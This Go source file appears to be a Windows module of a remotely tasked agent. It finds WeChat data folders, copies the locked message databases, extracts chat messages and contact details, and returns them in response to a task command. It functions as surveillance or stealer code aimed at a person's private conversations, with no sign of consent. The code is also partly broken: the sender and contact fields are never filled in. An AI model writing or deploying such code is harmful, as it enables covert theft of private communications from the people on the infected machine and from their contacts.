//go:build windows
// +build windows

package main

import (
	"database/sql"
	"encoding/json"
	"fmt"
	"io"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"time"

	_ "modernc.org/sqlite"
)

const (
	wechatHistoryMaxDBBytes = 64 << 20 // 64 MB
	wechatHistoryMaxRows    = 200
)

type wechatFilter struct {
	Filter    string `json:"filter"`
	Contact   string `json:"contact"`
	StartTime string `json:"start_time"`
	EndTime   string `json:"end_time"`
}

type wechatMessage struct {
	Time      string `json:"time"`
	Sender    string `json:"sender"`     // "me" or "other"
	Contact   string `json:"contact"`    // contact name/remark
	ContactID string `json:"contact_id"` // wxid
	Type      int    `json:"type"`       // message type
	Content   string `json:"content"`    // message content (may be encrypted)
}

func handleWeChatHistory(task Task, res *TaskResult) {
	var f wechatFilter
	if task.Command != "" {
		_ = json.Unmarshal([]byte(task.Command), &f)
	}
	if f.Filter == "" {
		f.Filter = "all"
	}
	out := exportWeChatHistory(f)
	res.Output = out
}

func wechatDataRoots() []string {
	if runtime.GOOS != "windows" {
		return nil
	}
	appdata := os.Getenv("APPDATA")
	if appdata == "" {
		return nil
	}
	root := filepath.Join(appdata, "Tencent", "WeChat")
	entries, err := os.ReadDir(root)
	if err != nil {
		return nil
	}
	var roots []string
	for _, e := range entries {
		if !e.IsDir() {
			continue
		}
		msgDir := filepath.Join(root, e.Name(), "Msg")
		if _, err := os.Stat(msgDir); err == nil {
			roots = append(roots, msgDir)
		}
	}
	return roots
}

func exportWeChatHistory(f wechatFilter) string {
	f.Filter = strings.ToLower(strings.TrimSpace(f.Filter))
	if f.Filter == "" {
		f.Filter = "all"
	}
	f.Contact = strings.ToLower(strings.TrimSpace(f.Contact))

	startTime, endTime := parseWeChatRange(f)

	var sb strings.Builder
	sb.WriteString("=== wechat history ===\n")

	roots := wechatDataRoots()
	if len(roots) == 0 {
		sb.WriteString("(WeChat data directory not found or not on Windows)\n")
		return sb.String()
	}

	totalRows := 0
	matched := 0

	for _, msgRoot := range roots {
		entries, err := os.ReadDir(msgRoot)
		if err != nil {
			continue
		}
		for _, e := range entries {
			if !strings.HasSuffix(e.Name(), ".db") {
				continue
			}
			dbPath := filepath.Join(msgRoot, e.Name())
			rows, err := queryWeChatDB(dbPath, f, startTime, endTime)
			if err != nil {
				fmt.Fprintf(&sb, "=== %s ===\nquery error: %v\n", e.Name(), err)
				continue
			}
			if len(rows) > 0 {
				matched++
				for _, r := range rows {
					totalRows++
					// Output as JSON line for easy parsing
					line, _ := json.Marshal(r)
					sb.WriteString(string(line))
					sb.WriteString("\n")
				}
			}
		}
	}

	if totalRows == 0 {
		sb.WriteString("(no matching messages found)\n")
	}
	fmt.Fprintf(&sb, "# total_rows=%d\n", totalRows)
	return sb.String()
}

func copyLockedDBSrc(src string) (string, error) {
	fi, err := os.Stat(src)
	if err != nil {
		return "", err
	}
	if fi.Size() > wechatHistoryMaxDBBytes {
		return "", fmt.Errorf("history db too large (%d bytes, cap %d)", fi.Size(), wechatHistoryMaxDBBytes)
	}
	dst := filepath.Join(os.TempDir(), fmt.Sprintf("wechat_hist_%d.db", time.Now().UnixNano()))
	in, err := os.Open(src)
	if err != nil {
		return "", err
	}
	defer in.Close()
	out, err := os.OpenFile(dst, os.O_CREATE|os.O_WRONLY|os.O_TRUNC, 0o600)
	if err != nil {
		return "", err
	}
	_, copyErr := io.Copy(out, io.LimitReader(in, wechatHistoryMaxDBBytes+1))
	closeErr := out.Close()
	if copyErr != nil {
		os.Remove(dst)
		return "", copyErr
	}
	if closeErr != nil {
		os.Remove(dst)
		return "", closeErr
	}
	return dst, nil
}

func queryWeChatDB(dbPath string, f wechatFilter, startTime, endTime time.Time) ([]wechatMessage, error) {
	tmp, err := copyLockedDBSrc(dbPath)
	if err != nil {
		return nil, err
	}
	defer os.Remove(tmp)

	db, err := sql.Open("sqlite", tmp)
	if err != nil {
		return nil, err
	}
	defer db.Close()

	// WeChat message table schema (typical):
	// message: MsgId, CreateTime, TalkerId, Type, Content, IsSender, MsgSource
	// contact: UserName, Alias, Remark, NickName, Type
	query := `
		SELECT m.MsgId, m.CreateTime, m.TalkerId, m.Type, m.Content, m.IsSender,
		       IFNULL(c.NickName,''), IFNULL(c.Alias,''), IFNULL(c.Remark,'')
		FROM message m
		LEFT JOIN contact c ON m.TalkerId = c.UserName
		WHERE m.CreateTime >= ? AND m.CreateTime <= ?
	`
	args := []interface{}{unixMilli(startTime), unixMilli(endTime)}

	if f.Contact != "" && f.Contact != "all" {
		query += ` AND (LOWER(IFNULL(c.NickName,'')) LIKE ? OR LOWER(IFNULL(c.Alias,'')) LIKE ? OR LOWER(IFNULL(c.Remark,'')) LIKE ? OR LOWER(m.TalkerId) LIKE ?)`
		like := "%" + f.Contact + "%"
		args = append(args, like, like, like, like)
	}

	query += ` ORDER BY m.CreateTime DESC LIMIT ?`
	args = append(args, wechatHistoryMaxRows)

	rows, err := db.Query(query, args...)
	if err != nil {
		return nil, err
	}
	defer rows.Close()

	var results []wechatMessage
	for rows.Next() {
		var msg wechatMessage
		var msgID int64
		var createTime int64
		var talkerID string
		var nickName, alias, remark string
		var isSender int
		if err := rows.Scan(&msgID, &createTime, &talkerID, &msg.Type, &msg.Content, &isSender, &nickName, &alias, &remark); err != nil {
			continue
		}
		msg.ContactID = talkerID
		msg.Time = time.UnixMilli(createTime).UTC().Format(time.RFC3339)
		results = append(results, msg)
	}
	return results, nil
}

func parseWeChatRange(f wechatFilter) (time.Time, time.Time) {
	var startTime, endTime time.Time
	if f.StartTime != "" {
		if t, err := time.Parse(time.RFC3339, f.StartTime); err == nil {
			startTime = t
		}
	}
	// An empty end time means "up to now". Without this default, the SQL
	// upper bound would be zero and legitimate history would be filtered out.
	if f.EndTime != "" {
		if t, err := time.Parse(time.RFC3339, f.EndTime); err == nil {
			endTime = t
		}
	}
	if endTime.IsZero() {
		endTime = time.Now().UTC()
	}
	return startTime, endTime
}

func unixMilli(t time.Time) int64 {
	if t.IsZero() {
		return 0
	}
	return t.UnixMilli()
}
